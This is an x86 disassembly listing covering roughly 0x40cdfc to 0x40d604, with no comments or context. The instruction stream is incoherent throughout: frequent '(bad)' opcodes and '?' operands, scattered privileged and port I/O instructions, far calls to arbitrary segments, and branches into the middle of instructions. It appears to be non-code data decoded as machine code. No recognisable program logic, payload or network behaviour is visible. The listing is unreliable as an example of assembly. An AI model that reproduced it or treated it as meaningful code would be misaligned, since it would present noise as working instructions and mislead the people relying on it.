  40cdfc:	mov    esp,0x52a7d4da
  40ce01:	xor    bl,BYTE PTR [esi+0x4fdceab7]
  40ce07:	pop    eax
  40ce08:	(bad)  
  40ce09:	jl     0x40ce46
  40ce0b:	xor    ah,ah
  40ce0d:	jge    0x40ce0d
  40ce0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ce10:	mov    DWORD PTR [edx+0x75],ebp
  40ce13:	rol    cl,cl
  40ce15:	fcomp  DWORD PTR [eax-0x14f4bdb0]
  40ce1b:	cmp    DWORD PTR [edx+ebx*4-0x1d],esi
  40ce1f:	add    eax,0x16f1ed58
  40ce24:	neg    DWORD PTR [esi-0x368a466c]
  40ce2a:	push   esp
  40ce2b:	push   ds
  40ce2c:	mov    al,ds:0x5ab929e4
  40ce31:	xchg   ebx,eax
  40ce32:	fistp  WORD PTR [edx]
  40ce34:	add    al,0x55
  40ce36:	and    al,0xff
  40ce38:	push   ebx
  40ce39:	retf   
  40ce3a:	iret   
  40ce3b:	or     ch,BYTE PTR [esi-0x78]
  40ce3e:	sub    dh,BYTE PTR [ebx-0x5]
  40ce41:	mov    bh,0x3c
  40ce43:	sub    BYTE PTR [ecx+0x18],ch
  40ce46:	fild   DWORD PTR [edi]
  40ce48:	sti    
  40ce49:	xchg   esp,eax
  40ce4a:	repnz or dh,BYTE PTR [edi]
  40ce4d:	movntq (bad),mm1
  40ce4e:	out    0xc8,eax
  40ce50:	xchg   edi,eax
  40ce51:	add    DWORD PTR [eax],esp
  40ce53:	jns    0x40ce22
  40ce55:	sub    ebx,DWORD PTR [ecx+0x3d]
  40ce58:	cmp    DWORD PTR [ebp+0x56b2a7ff],0x13
  40ce5f:	xor    bh,bl
  40ce61:	inc    ebp
  40ce62:	and    al,0xbd
  40ce64:	out    dx,al
  40ce65:	stos   BYTE PTR es:[edi],al
  40ce66:	je     0x40cece
  40ce68:	ins    BYTE PTR es:[edi],dx
  40ce69:	out    dx,eax
  40ce6a:	dec    ebp
  40ce6b:	nop
  40ce6c:	mov    bh,BYTE PTR [eax+0x115247d0]
  40ce72:	mov    ebx,DWORD PTR [ebp+0x43d03539]
  40ce78:	sbb    dl,BYTE PTR [ecx]
  40ce7a:	mov    ss,esi
  40ce7c:	les    esp,FWORD PTR [eax]
  40ce7e:	xor    BYTE PTR es:[edi+0x7a],dh
  40ce82:	fsin   
  40ce84:	xchg   BYTE PTR [ebp+0x67],bl
  40ce87:	xor    al,0xa5
  40ce89:	fstp   TBYTE PTR [edx]
  40ce8b:	hlt    
  40ce8c:	xorps  xmm7,XMMWORD PTR [edi+ebx*4+0x3c713a80]
  40ce94:	rcl    BYTE PTR [eax+0x10],0xc0
  40ce98:	idiv   BYTE PTR [edi]
  40ce9a:	jp     0x40ce94
  40ce9c:	inc    edx
  40ce9d:	popf   
  40ce9e:	mov    ds:0xa857ac82,al
  40cea3:	int    0x3e
  40cea5:	jge    0x40ce4e
  40cea7:	xchg   esp,eax
  40cea8:	mov    edi,0x22abea3e
  40cead:	lea    esi,[edx]
  40ceaf:	or     BYTE PTR [eax+0x7e],ch
  40ceb2:	sbb    BYTE PTR [esi+0x6dbb5af1],dh
  40ceb8:	test   al,0xd0
  40ceba:	(bad)  [ebx]
  40cebc:	pop    es
  40cebd:	pop    eax
  40cebe:	inc    esi
  40cebf:	lds    edx,FWORD PTR [edi+0x8]
  40cec2:	pusha  
  40cec3:	add    edi,ebx
  40cec5:	aad    0x41
  40cec7:	xor    bh,BYTE PTR [esi-0x6ab58e3a]
  40cecd:	fisttp QWORD PTR [eax]
  40cecf:	adc    DWORD PTR [edi+0x50],esp
  40ced2:	add    al,0xf0
  40ced4:	aaa    
  40ced5:	xchg   ebp,eax
  40ced6:	aam    0x92
  40ced8:	int3   
  40ced9:	cli    
  40ceda:	loopne 0x40ce94
  40cedc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cedd:	bound  edx,QWORD PTR [eax-0x674feebf]
  40cee3:	mov    WORD PTR [ebp+0x11],cs
  40cee6:	out    0xd1,al
  40cee8:	add    BYTE PTR [ebx+0x1bc7e37c],dl
  40ceee:	push   esi
  40ceef:	push   es
  40cef0:	cmc    
  40cef1:	push   0xb
  40cef3:	popa   
  40cef4:	loop   0x40cf72
  40cef6:	mov    al,ds:0x329e4caa
  40cefb:	iret   
  40cefc:	dec    ebp
  40cefd:	jne    0x40ceca
  40ceff:	or     eax,0x4e73d85a
  40cf04:	sub    BYTE PTR ds:0xc6c4b89b,bh
  40cf0a:	sub    BYTE PTR [ecx],cl
  40cf0c:	std    
  40cf0d:	rcl    BYTE PTR [ecx+0x2],0x7a
  40cf11:	jp     0x40cefb
  40cf13:	xchg   ebx,eax
  40cf14:	lea    esp,[edx+esi*4-0x29]
  40cf18:	in     al,0x81
  40cf1a:	ins    BYTE PTR es:[edi],dx
  40cf1b:	inc    edi
  40cf1c:	inc    eax
  40cf1d:	js     0x40ced1
  40cf1f:	mov    ds:0x60bc05f0,al
  40cf24:	adc    DWORD PTR [eax+0x1ace91bf],edx
  40cf2a:	push   ss
  40cf2b:	mov    edi,0xcb1ea2b7
  40cf30:	mov    al,dl
  40cf32:	mov    edx,0x1657f286
  40cf37:	mov    ch,0x83
  40cf39:	int    0xe0
  40cf3b:	add    eax,0x45252920
  40cf40:	or     ebx,ecx
  40cf42:	pusha  
  40cf43:	dec    ebx
  40cf44:	xchg   edi,eax
  40cf45:	inc    edi
  40cf46:	jl     0x40cf41
  40cf48:	push   ebp
  40cf49:	aaa    
  40cf4a:	cmc    
  40cf4b:	mov    edx,edi
  40cf4d:	in     eax,dx
  40cf4e:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40cf50:	sub    edi,eax
  40cf52:	jb     0x40cf8b
  40cf54:	ror    ch,cl
  40cf56:	in     eax,0x7d
  40cf58:	add    esp,DWORD PTR [edx-0x6c75bb15]
  40cf5e:	xlat   BYTE PTR ds:[ebx]
  40cf5f:	(bad)  
  40cf60:	fucomip st,st(4)
  40cf62:	outs   dx,DWORD PTR ds:[esi]
  40cf63:	sahf   
  40cf64:	jle    0x40cf44
  40cf66:	retf   0x4a06
  40cf69:	mov    eax,0x7cddf27
  40cf6e:	bound  esp,QWORD PTR [esi+0x2d7e1f02]
  40cf74:	pop    ss
  40cf75:	add    ecx,eax
  40cf77:	jp     0x40cfde
  40cf79:	and    ch,BYTE PTR [ebx+ebx*1-0x49]
  40cf7d:	push   edi
  40cf7e:	aad    0xec
  40cf80:	mov    ebx,0x33c63a23
  40cf85:	jl     0x40cfa2
  40cf87:	inc    edx
  40cf88:	das    
  40cf89:	and    ebx,ebx
  40cf8b:	mov    WORD PTR [ecx+ebx*2+0x3da27095],ss
  40cf92:	and    al,0x7e
  40cf94:	cmp    eax,0x611d6563
  40cf99:	and    BYTE PTR [edx+0x21059673],0x96
  40cfa0:	mov    BYTE PTR [edx-0x5336193e],dh
  40cfa6:	cmp    ecx,edx
  40cfa8:	int    0xf0
  40cfaa:	and    eax,0x1da20d6d
  40cfaf:	int    0x60
  40cfb1:	push   0x14bd7b5f
  40cfb6:	jbe    0x40cfc5
  40cfb8:	loop   0x40cff8
  40cfba:	add    al,0xe2
  40cfbc:	popf   
  40cfbd:	jecxz  0x40cfc2
  40cfbf:	adc    DWORD PTR [edi+0x58d114a7],0x32b62ebb
  40cfc9:	dec    esp
  40cfca:	jne    0x40cfd5
  40cfcc:	mov    esp,0xe472bf82
  40cfd1:	outs   dx,BYTE PTR ds:[esi]
  40cfd2:	and    BYTE PTR [ebp+0x7c],ch
  40cfd5:	sar    BYTE PTR [ebx-0x421b184b],1
  40cfdb:	pop    edx
  40cfdc:	adc    bh,BYTE PTR [ebx+eax*2-0x78]
  40cfe0:	aam    0x3c
  40cfe2:	nop
  40cfe3:	(bad)  
  40cfe4:	into   
  40cfe5:	call   0x5ba41395
  40cfea:	lods   al,BYTE PTR ds:[esi]
  40cfeb:	jbe    0x40d05a
  40cfed:	shr    DWORD PTR [edx+0x67],1
  40cff0:	leave  
  40cff1:	js     0x40cfd3
  40cff3:	out    dx,al
  40cff4:	mov    eax,0x8376a8bf
  40cff9:	in     al,dx
  40cffa:	mov    ah,0x19
  40cffc:	xchg   edx,eax
  40cffd:	push   es
  40cffe:	js     0x40d01e
  40d000:	aam    0xb5
  40d002:	dec    esi
  40d003:	(bad)
  40d006:	shl    BYTE PTR [ecx],1
  40d008:	fisttp WORD PTR [ebp+0x55]
  40d00b:	xchg   ebx,eax
  40d00c:	push   ss
  40d00d:	sub    BYTE PTR [esi-0x11],ch
  40d010:	jo     0x40cf9c
  40d012:	inc    ebp
  40d013:	pop    edx
  40d014:	fcomip st,st(6)
  40d016:	mov    DWORD PTR ds:0xa52932f8,ebp
  40d01c:	lds    ebp,FWORD PTR [edi+0x5baf39b5]
  40d022:	sar    ch,cl
  40d024:	jno    0x40cff7
  40d026:	out    dx,al
  40d027:	xchg   DWORD PTR [ebx+0x6615d61f],ecx
  40d02d:	and    al,0xff
  40d02f:	loop   0x40cfbf
  40d031:	fldl2e 
  40d033:	push   ebp
  40d034:	jae    0x40d06e
  40d036:	faddp  st(3),st
  40d038:	pop    edx
  40d039:	jae    0x40d021
  40d03b:	inc    edx
  40d03c:	mul    DWORD PTR [esi+0x78]
  40d03f:	or     eax,0x36607ef0
  40d044:	xor    al,0xe8
  40d046:	mov    ds:0x318ad090,eax
  40d04b:	push   esp
  40d04c:	repnz lea esp,[edx]
  40d04f:	scas   al,BYTE PTR es:[edi]
  40d050:	xadd   dh,dl
  40d053:	arpl   WORD PTR [ebp+0x56f10c8e],ax
  40d059:	mov    edi,0x2187d506
  40d05e:	inc    eax
  40d05f:	outs   dx,DWORD PTR ds:[esi]
  40d060:	xchg   edx,eax
  40d061:	loope  0x40d028
  40d063:	sub    ebp,DWORD PTR ds:0xeb18963f
  40d069:	pusha  
  40d06a:	mov    bl,0x8
  40d06c:	out    dx,al
  40d06d:	shl    edx,0x79
  40d070:	lahf   
  40d071:	pop    edx
  40d072:	in     al,dx
  40d073:	in     al,dx
  40d074:	pop    es
  40d075:	cwde   
  40d076:	xchg   esp,eax
  40d077:	dec    ecx
  40d078:	and    eax,0xb9a625d9
  40d07d:	xchg   edi,eax
  40d07e:	stos   DWORD PTR es:[edi],eax
  40d07f:	retf   
  40d080:	(bad)  
  40d082:	jg     0x40d056
  40d084:	je     0x40d0fd
  40d086:	mov    esp,DWORD PTR [eax-0x2e]
  40d089:	add    ecx,DWORD PTR [eax+0x8]
  40d08c:	xchg   ebx,eax
  40d08d:	xchg   edi,eax
  40d08e:	aad    0xf7
  40d090:	int3   
  40d091:	mov    ss,WORD PTR [ebx]
  40d093:	push   0xffffffbc
  40d095:	sbb    eax,0x94b302b7
  40d09a:	mov    edx,0x9e46c536
  40d09f:	xchg   edi,eax
  40d0a0:	or     BYTE PTR [ebx+eiz*1-0x6736594d],bl
  40d0a7:	and    DWORD PTR [eax+0x16],ecx
  40d0aa:	push   ebp
  40d0ab:	setns  BYTE PTR [esi-0x75]
  40d0af:	sbb    al,0xd8
  40d0b1:	outs   dx,DWORD PTR ds:[esi]
  40d0b2:	mov    esp,0x8cc16a0
  40d0b7:	(bad)  
  40d0b8:	pop    ebp
  40d0b9:	xor    ah,BYTE PTR [ebx]
  40d0bb:	mov    edi,DWORD PTR [eax]
  40d0bd:	imul   esp,DWORD PTR [ebx],0x7e
  40d0c0:	cmp    DWORD PTR [eax+ebp*4+0x6f347da0],eax
  40d0c7:	retf   
  40d0c8:	adc    al,0xc8
  40d0ca:	and    bl,bl
  40d0cc:	popa   
  40d0cd:	mov    al,0x73
  40d0cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d0d0:	call   0x4e05:0xc599eb40
  40d0d7:	pusha  
  40d0d8:	inc    ebp
  40d0d9:	sbb    BYTE PTR [esi+0x436cda81],dh
  40d0df:	test   BYTE PTR [ecx-0x4d],bl
  40d0e2:	fmul   QWORD PTR [edx+0x712d4111]
  40d0e8:	loop   0x40d0ca
  40d0ea:	mov    al,ds:0x793376bc
  40d0ef:	mov    edi,0xa0849c88
  40d0f4:	(bad)
  40d0f9:	mov    ch,0xa1
  40d0fb:	xchg   edx,eax
  40d0fc:	call   0x8051:0x771994ed
  40d103:	addr16 shl al,0x21
  40d107:	dec    ebx
  40d108:	pop    ecx
  40d109:	popa   
  40d10a:	mov    esp,0x89097f30
  40d10f:	retf   0xdec6
  40d112:	test   DWORD PTR [ebx+ecx*4-0xe],ebx
  40d116:	and    al,0x84
  40d118:	push   edi
  40d119:	aas    
  40d11a:	and    ebp,DWORD PTR [ecx+0xafd9924]
  40d120:	pop    ebx
  40d121:	push   cs
  40d122:	retf   
  40d123:	cmp    sp,WORD PTR [edi+0x45]
  40d127:	fist   WORD PTR [esi]
  40d129:	push   esp
  40d12a:	sahf   
  40d12b:	mov    ebp,ds
  40d12d:	xor    BYTE PTR [edx],ch
  40d12f:	dec    edx
  40d130:	clc    
  40d131:	pavgb  mm3,mm7
  40d134:	retf   0xc957
  40d137:	mov    dl,0x34
  40d139:	jecxz  0x40d132
  40d13b:	or     dh,BYTE PTR [ecx-0x77d16333]
  40d141:	sbb    ecx,DWORD PTR [edx+edx*8-0x31125448]
  40d148:	lods   al,BYTE PTR ds:[esi]
  40d149:	and    edx,DWORD PTR [eax+0x4]
  40d14c:	std    
  40d14d:	out    0xd4,eax
  40d14f:	retf   0x2b24
  40d152:	stos   DWORD PTR es:[edi],eax
  40d153:	inc    esp
  40d154:	hlt    
  40d155:	ret    0x1ed0
  40d158:	cli    
  40d159:	mov    edi,0x56dd6d94
  40d15e:	xchg   ebx,eax
  40d15f:	dec    esi
  40d160:	mov    dh,0x11
  40d162:	(bad)  
  40d163:	scas   al,BYTE PTR es:[edi]
  40d164:	push   ebp
  40d165:	dec    ecx
  40d166:	xbegin 0xe26525d
  40d16c:	inc    edx
  40d16d:	(bad)  
  40d16e:	aas    
  40d16f:	jg     0x40d131
  40d171:	and    ch,BYTE PTR [ebx+0x1a166571]
  40d177:	ret    0x622c
  40d17a:	call   0x207d:0xddc15aea
  40d181:	gs cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d184:	gs jmp 0x4888:0x7e502bcb
  40d18c:	jnp    0x40d163
  40d18e:	addr16 jmp 0x40d15a
  40d191:	pop    esi
  40d192:	mov    dh,0x3c
  40d194:	jge    0x40d129
  40d196:	leave  
  40d197:	test   BYTE PTR [edi],0xa6
  40d19a:	mov    edx,0x976bb321
  40d19f:	jnp    0x40d21c
  40d1a1:	add    BYTE PTR [ebp-0x5e446c5f],0xcc
  40d1a8:	int    0x81
  40d1aa:	inc    ebp
  40d1ab:	in     eax,0x4c
  40d1ad:	jbe    0x40d210
  40d1af:	bound  edx,QWORD PTR [ebp+0x34]
  40d1b2:	dec    ebp
  40d1b3:	arpl   WORD PTR [eax-0x63],bp
  40d1b6:	jnp    0x40d13d
  40d1b8:	sub    al,0xc1
  40d1ba:	adc    dh,bl
  40d1bc:	add    al,BYTE PTR cs:[esp+edi*2]
  40d1c0:	out    dx,eax
  40d1c1:	loop   0x40d17c
  40d1c3:	or     esp,ebx
  40d1c5:	stos   DWORD PTR es:[edi],eax
  40d1c6:	mov    esi,0x9bc2b6f5
  40d1cb:	js     0x40d222
  40d1cd:	daa    
  40d1ce:	adc    dl,dh
  40d1d0:	jo     0x40d1c5
  40d1d2:	mov    ebp,esp
  40d1d4:	cmp    DWORD PTR [edx-0x54900218],esi
  40d1da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1db:	loopne 0x40d1d1
  40d1dd:	push   esi
  40d1de:	sub    DWORD PTR [eax+0x335747d9],ebp
  40d1e4:	pop    ebp
  40d1e5:	addr16 iret 
  40d1e7:	inc    esi
  40d1e8:	push   edi
  40d1e9:	cwde   
  40d1ea:	test   eax,0xcfb98384
  40d1ef:	fld    DWORD PTR [ebx+0x34]
  40d1f2:	xchg   BYTE PTR [ebx],al
  40d1f4:	sub    ch,0x2
  40d1f7:	es mov esp,0xa447ee6b
  40d1fd:	adc    al,0x9b
  40d1ff:	fwait
  40d200:	clc    
  40d201:	lds    edi,FWORD PTR [ebx+0x2b]
  40d204:	loopne 0x40d230
  40d206:	loop   0x40d238
  40d208:	rcr    BYTE PTR [eax-0x74a30962],1
  40d20e:	mov    esi,0x527e0fdf
  40d213:	sbb    eax,0xf5056c89
  40d218:	cli    
  40d219:	mov    dh,0xef
  40d21b:	adc    eax,0xcd416011
  40d220:	sub    DWORD PTR [edx-0x54a6356c],esp
  40d226:	sti    
  40d227:	mov    ebp,0xf847682
  40d22c:	and    edx,edx
  40d22e:	add    BYTE PTR [ebx-0x34],al
  40d231:	mov    eax,ds:0x3db31131
  40d236:	(bad)  
  40d237:	cli    
  40d238:	outs   dx,DWORD PTR ds:[esi]
  40d239:	mov    ecx,0x75a2db3d
  40d23e:	icebp  
  40d23f:	or     DWORD PTR [ecx+ebp*8+0x5f],0x26
  40d244:	in     al,dx
  40d245:	add    al,0x3a
  40d247:	jb     0x40d1f7
  40d249:	sar    edx,1
  40d24b:	sbb    al,BYTE PTR [ecx+0x70d73efa]
  40d251:	scas   al,BYTE PTR es:[edi]
  40d252:	xchg   edx,eax
  40d253:	gs (bad) 
  40d255:	pop    eax
  40d256:	xchg   esp,eax
  40d257:	and    dl,BYTE PTR [edx]
  40d259:	push   0x1d
  40d25b:	out    dx,al
  40d25c:	ret    
  40d25d:	stos   BYTE PTR es:[edi],al
  40d25e:	pop    edx
  40d25f:	or     DWORD PTR [ebp-0x33],0xb
  40d263:	repz add eax,0xa796ca0a
  40d269:	mov    dh,0xf5
  40d26b:	or     DWORD PTR [ebx+0x2eaa20b3],ecx
  40d271:	call   0x14ded8dc
  40d276:	out    0x97,eax
  40d278:	mov    ebp,0x153b984
  40d27d:	das    
  40d27e:	xchg   edx,eax
  40d27f:	add    BYTE PTR [ebx*8-0x4fe7dc01],ah
  40d286:	xor    BYTE PTR [esi+edx*2-0x17],bl
  40d28a:	mov    ds:0x7bb1e020,al
  40d28f:	inc    ebp
  40d290:	call   0x2fa:0x2a4a7666
  40d297:	lock mov al,0x91
  40d29a:	out    0x75,eax
  40d29c:	xlat   BYTE PTR ds:[ebx]
  40d29d:	or     BYTE PTR [ecx+ebx*4],0xb1
  40d2a1:	push   esi
  40d2a2:	and    ebp,DWORD PTR [eax+0x15420f78]
  40d2a8:	xor    al,0xfc
  40d2aa:	out    dx,eax
  40d2ab:	inc    ecx
  40d2ac:	xchg   edx,eax
  40d2ad:	jmp    DWORD PTR ds:0xd00a733b
  40d2b3:	pushf  
  40d2b4:	and    eax,0xe003ea28
  40d2b9:	jno    0x40d26f
  40d2bb:	rol    BYTE PTR gs:[eax+0x5b],cl
  40d2bf:	das    
  40d2c0:	pop    ss
  40d2c1:	int3   
  40d2c2:	or     bl,BYTE PTR [eax+esi*1]
  40d2c5:	mov    dh,0x69
  40d2c7:	cwde   
  40d2c8:	push   ds
  40d2c9:	jae    0x40d301
  40d2cb:	(bad)  
  40d2cc:	aam    0x8e
  40d2ce:	mov    bl,0xa0
  40d2d0:	sbb    ah,BYTE PTR [edi+edx*1+0x1a39dfc5]
  40d2d7:	jmp    0x40d34c
  40d2d9:	push   eax
  40d2da:	inc    eax
  40d2db:	(bad)  
  40d2dd:	cmc    
  40d2de:	jge    0x40d2b7
  40d2e0:	and    al,0x6
  40d2e2:	mov    al,0xa5
  40d2e4:	pop    ebp
  40d2e5:	(bad)  
  40d2e6:	arpl   WORD PTR [edi],dx
  40d2e8:	in     al,dx
  40d2e9:	rcr    esi,cl
  40d2eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d2ec:	jnp    0x40d278
  40d2ee:	sub    eax,0xd4bba2e4
  40d2f3:	stc    
  40d2f4:	not    BYTE PTR [ecx-0x4]
  40d2f7:	popf   
  40d2f8:	mov    al,es:0x31ed9a08
  40d2fe:	mov    eax,ds:0xae17ee24
  40d303:	test   eax,0xdbf3f4a6
  40d308:	or     ebx,DWORD PTR [ebx]
  40d30a:	jo     0x40d317
  40d30c:	adc    edx,esi
  40d30e:	ins    BYTE PTR es:[edi],dx
  40d30f:	aad    0x38
  40d311:	mov    dh,0x92
  40d313:	push   ebx
  40d314:	fst    st(4)
  40d316:	fcmovnbe st,st(3)
  40d318:	pop    esp
  40d319:	jne    0x40d33b
  40d31b:	sahf   
  40d31c:	mov    edx,0xcdcf8ff2
  40d321:	mov    eax,esi
  40d323:	inc    esi
  40d324:	mov    edi,0x7aafa884
  40d329:	gs enter 0xb470,0x44
  40d32e:	push   0x66
  40d330:	js     0x40d347
  40d332:	push   ebx
  40d333:	fsubp  st(5),st
  40d335:	hlt    
  40d336:	jb     0x40d35e
  40d338:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d339:	mov    eax,0x16d42be4
  40d33e:	ret    0x7e1
  40d341:	inc    eax
  40d342:	je     0x40d31e
  40d344:	hlt    
  40d345:	mov    BYTE PTR [ebx+eax*4+0x57],bl
  40d349:	or     eax,0x1ec27dc1
  40d34e:	pop    eax
  40d34f:	pop    esp
  40d350:	adc    BYTE PTR [eax-0x33],dl
  40d353:	in     al,dx
  40d354:	jl     0x40d3bc
  40d356:	stc    
  40d357:	sub    ebx,ecx
  40d359:	imul   ebp,DWORD PTR [eax+0x30720b63],0x3b
  40d360:	mov    bl,0xb7
  40d362:	sbb    BYTE PTR [esi-0x1a],0xf2
  40d366:	lds    ebp,FWORD PTR [edi]
  40d368:	push   ecx
  40d369:	sub    BYTE PTR [edx+0x6243d630],al
  40d36f:	mov    DWORD PTR [ebx-0x49],esi
  40d372:	jno    0x40d36d
  40d374:	loop   0x40d317
  40d376:	and    BYTE PTR [ebp+ebp*1-0x250ceae7],dl
  40d37d:	xor    eax,0x94dc0013
  40d382:	mov    ah,0xdb
  40d384:	pusha  
  40d385:	test   BYTE PTR [ecx],bl
  40d387:	addr16 mov ah,0xbd
  40d38a:	push   es
  40d38b:	pop    es
  40d38c:	fs (bad) 
  40d38e:	ins    DWORD PTR es:[edi],dx
  40d38f:	add    eax,0x5e984e2d
  40d394:	jle    0x40d386
  40d396:	shr    BYTE PTR [ecx],0xd1
  40d399:	pop    ss
  40d39a:	retf   0xf90b
  40d39d:	faddp  st(1),st
  40d39f:	inc    ecx
  40d3a0:	sbb    esp,DWORD PTR [edi+edx*4+0x76]
  40d3a4:	push   esp
  40d3a5:	sub    al,BYTE PTR [ecx]
  40d3a7:	jns    0x40d38b
  40d3a9:	mov    ebp,0x25813be0
  40d3ae:	cli    
  40d3af:	push   edx
  40d3b0:	lds    esp,FWORD PTR [ebx+0x425408d2]
  40d3b6:	repz call 0xfef0:0xecb228a0
  40d3be:	in     al,0xf7
  40d3c0:	outs   dx,BYTE PTR ds:[esi]
  40d3c1:	and    eax,0x99e55ab5
  40d3c6:	test   DWORD PTR [ecx],0xa2fe331d
  40d3cc:	call   0xeedf:0xdb8365e0
  40d3d3:	(bad)  
  40d3d4:	cmp    edi,DWORD PTR [edi-0x53]
  40d3d7:	mov    esp,0x9747f467
  40d3dc:	mov    ch,0xc
  40d3de:	add    eax,0xcf74d428
  40d3e3:	mov    WORD PTR cs:[edi],?
  40d3e6:	mov    ebp,0xf81c0fb2
  40d3eb:	aad    0x7f
  40d3ed:	(bad)  
  40d3ee:	sbb    eax,0x6fd262fe
  40d3f3:	sar    DWORD PTR [esi+eax*4],cl
  40d3f6:	cwde   
  40d3f7:	int3   
  40d3f8:	dec    ebx
  40d3f9:	repz jp 0xfa224f0c
  40d400:	fwait
  40d401:	add    eax,0xe20ef5fa
  40d406:	xchg   edx,eax
  40d407:	jle    0x40d47e
  40d409:	ds adc eax,0xe37579ed
  40d40f:	or     al,0x99
  40d411:	loopne 0x40d473
  40d413:	in     eax,0x35
  40d415:	daa    
  40d416:	lds    edx,FWORD PTR [ecx-0xdbdd6bf]
  40d41c:	jb     0x40d3f7
  40d41e:	pushf  
  40d41f:	xchg   dl,ah
  40d421:	pop    esi
  40d422:	jl     0x40d47e
  40d424:	pop    ebx
  40d425:	mov    ebx,0x9286fbd5
  40d42a:	xchg   BYTE PTR [ebx],bl
  40d42c:	jne    0x40d3fd
  40d42e:	pushf  
  40d42f:	jg     0x40d42b
  40d431:	fcom   DWORD PTR ds:0xf5bd3b89
  40d437:	test   al,0x3c
  40d439:	out    dx,al
  40d43a:	aaa    
  40d43b:	add    eax,0xdd9a5598
  40d440:	daa    
  40d441:	scas   eax,DWORD PTR es:[edi]
  40d442:	fsub   QWORD PTR [ecx+eax*1-0x4c469ca3]
  40d449:	and    cl,bh
  40d44b:	add    cl,BYTE PTR [ebp+0x42ffe411]
  40d451:	mov    ebp,0x8f4dfc9f
  40d456:	mov    ah,0xfb
  40d458:	pusha  
  40d459:	push   esp
  40d45a:	sub    BYTE PTR [ebx],ah
  40d45c:	imul   ecx,edx,0x6e
  40d45f:	lods   eax,DWORD PTR ds:[esi]
  40d460:	out    0x10,al
  40d462:	push   cs
  40d463:	push   eax
  40d464:	aam    0x40
  40d466:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d467:	push   esi
  40d468:	in     eax,0x72
  40d46a:	int3   
  40d46b:	mov    al,ds:0xa1af4749
  40d470:	ret    0x8d7d
  40d473:	or     BYTE PTR [ecx-0x33],dh
  40d476:	jge    0x40d456
  40d478:	jne    0x40d45e
  40d47a:	or     ebx,DWORD PTR [ecx+0x61]
  40d47d:	xchg   ebp,eax
  40d47e:	sysenter 
  40d480:	loop   0x40d42a
  40d482:	pop    ds
  40d483:	ins    DWORD PTR es:[edi],dx
  40d484:	jmp    0x3688:0x516a30c9
  40d48b:	jle    0x40d478
  40d48d:	or     eax,0x2e8d1751
  40d492:	adc    al,0x9a
  40d494:	xlat   BYTE PTR ds:[ebx]
  40d495:	arpl   WORD PTR [ebp-0x18],ax
  40d498:	int    0xf0
	...
  40d512:	add    BYTE PTR [eax],al
  40d514:	adc    BYTE PTR [eax-0x20006009],bh
  40d51a:	js     0x40d4db
  40d51c:	shl    BYTE PTR [ebx-0x5e],cl
  40d51f:	mov    ds:0xf9f7f0b4,al
  40d524:	in     eax,dx
  40d525:	add    DWORD PTR [eax],0x0
  40d528:	outs   dx,BYTE PTR ds:[esi]
  40d529:	pop    es
  40d52a:	add    BYTE PTR [eax],al
  40d52c:	dec    edx
  40d52d:	jmp    0xd5826f2
  40d532:	pop    ss
  40d533:	dec    eax
  40d534:	xor    eax,0x69397372
  40d539:	imul   eax,DWORD PTR [edx+edx*2],0xd0537e9c
  40d540:	sbb    ecx,edi
  40d542:	fistp  DWORD PTR cs:[edi]
  40d545:	mov    dh,0x8c
  40d547:	jne    0x40d541
  40d549:	test   eax,0x77ae588e
  40d54e:	jno    0x40d553
  40d550:	mov    cl,BYTE PTR [ebx+0x7055d818]
  40d556:	fistp  WORD PTR [ebp+0x7a]
  40d559:	mov    dl,BYTE PTR [edx]
  40d55b:	lock and al,0xfc
  40d55e:	xor    DWORD PTR [ebx+0x2],esi
  40d561:	mov    eax,ds:0x45be06ae
  40d566:	pop    ecx
  40d567:	clc    
  40d568:	aas    
  40d569:	and    DWORD PTR [ecx+0x20],0x97854009
  40d570:	xchg   ebp,eax
  40d571:	fmulp  st(4),st
  40d573:	xchg   edx,eax
  40d574:	ret    0x8239
  40d577:	xchg   ecx,eax
  40d578:	and    DWORD PTR [ebx-0x660dcc2f],eax
  40d57e:	bound  ecx,QWORD PTR [ebp+0x734b555e]
  40d584:	mov    esi,0x21092cd9
  40d589:	xchg   ebx,eax
  40d58a:	cmp    edi,esp
  40d58c:	arpl   WORD PTR [edx+0x15],dx
  40d58f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d590:	mov    ch,0xc5
  40d592:	cs jnp 0x40d579
  40d595:	mov    bl,0xf8
  40d597:	test   al,0xc7
  40d599:	lods   al,BYTE PTR ds:[esi]
  40d59a:	mov    ?,WORD PTR [edi+0x3ab55b18]
  40d5a0:	push   ebx
  40d5a1:	or     BYTE PTR [edx],0xf8
  40d5a4:	test   DWORD PTR [ecx-0xe],ebx
  40d5a7:	out    0x86,eax
  40d5a9:	int3   
  40d5aa:	push   cs
  40d5ab:	xor    eax,0x691bf12b
  40d5b0:	popf   
  40d5b1:	je     0x40d543
  40d5b3:	mov    es,WORD PTR [edx]
  40d5b5:	cs and esi,ecx
  40d5b8:	mov    ds:0x4f247808,al
  40d5bd:	inc    eax
  40d5be:	imul   esi,DWORD PTR [esi+0x34],0xffffffc0
  40d5c2:	aaa    
  40d5c3:	in     al,0x8a
  40d5c5:	test   al,0xf5
  40d5c7:	bound  esp,QWORD PTR [esi]
  40d5c9:	mov    ebx,0x421c05f0
  40d5ce:	jg     0x40d629
  40d5d0:	sbb    al,0x36
  40d5d2:	jl     0x40d5f2
  40d5d4:	dec    DWORD PTR [esi-0x3d9ea234]
  40d5da:	mov    ebp,eax
  40d5dc:	fwait
  40d5dd:	inc    esp
  40d5de:	stos   BYTE PTR es:[edi],al
  40d5df:	sub    ebx,edi
  40d5e1:	ja     0x40d5c1
  40d5e3:	inc    ebx
  40d5e4:	mov    BYTE PTR [edx],cl
  40d5e6:	fisub  WORD PTR [edi]
  40d5e8:	(bad)  
  40d5e9:	mov    bh,0x47
  40d5eb:	dec    esp
  40d5ec:	repz sub al,0x41
  40d5ef:	outs   dx,BYTE PTR ds:[esi]
  40d5f0:	dec    ebp
  40d5f1:	cmp    DWORD PTR [ecx-0x2364cc9d],edi
  40d5f7:	cmp    eax,0xde7c1645
  40d5fc:	in     eax,0x19
  40d5fe:	div    BYTE PTR [ebp+0x2873a3d9]
  40d604:	adc    ecx,eax
